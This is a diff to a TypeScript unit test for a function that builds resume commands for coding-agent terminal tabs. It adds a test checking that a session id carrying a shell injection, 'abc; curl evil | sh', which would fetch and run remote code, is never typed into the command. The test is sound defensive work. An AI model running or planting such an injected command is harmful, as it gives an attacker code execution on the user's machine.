@@ -17,10 +17,13 @@ vi.mock('$lib/stores/workspaces.svelte', () => ({
 vi.mock('$lib/stores/agentState.svelte', () => ({
   resumeCommandFor: (rt: string) => (rt === 'codex' ? 'codex resume %codexSessionId' : 'claude --resume %claudeSessionId'),
 }));
-vi.mock('$lib/stores/triggers.svelte', () => ({
-  interpolateVariables: (tabId: string, text: string) =>
-    text.replace(/%(\w+)/g, (m, name) => vars.get(tabId)?.[name] ?? m),
-}));
+vi.mock('$lib/stores/triggers.svelte', async () => {
+  const { interpolateShellWith } = await import('$lib/triggers/shellInterpolate');
+  return {
+    interpolateShell: (tabId: string, text: string, clear = false) =>
+      interpolateShellWith(new Map(Object.entries(vars.get(tabId) ?? {})), text, clear),
+  };
+});
 
 const { relaunchLine } = await import('./launch');
 
@@ -43,6 +46,12 @@ describe('relaunchLine', () => {
   it('an ordinary tab with no session id keeps the % for its caller to refuse', async () => {
     tabs.t = { runtime: 'codex' };
     expect(await relaunchLine('t')).toBe('codex resume %codexSessionId');
+  });
+
+  it('a session id a shell would act on is never typed: the % stays for its caller to refuse', async () => {
+    tabs.t = { runtime: 'claude' };
+    vars.set('t', { claudeSessionId: 'abc; curl evil | sh' });
+    expect(await relaunchLine('t')).toBe('claude --resume %claudeSessionId');
   });
 
   it('a Hive tab gets the builder line, typed as Rust built it', async () => {
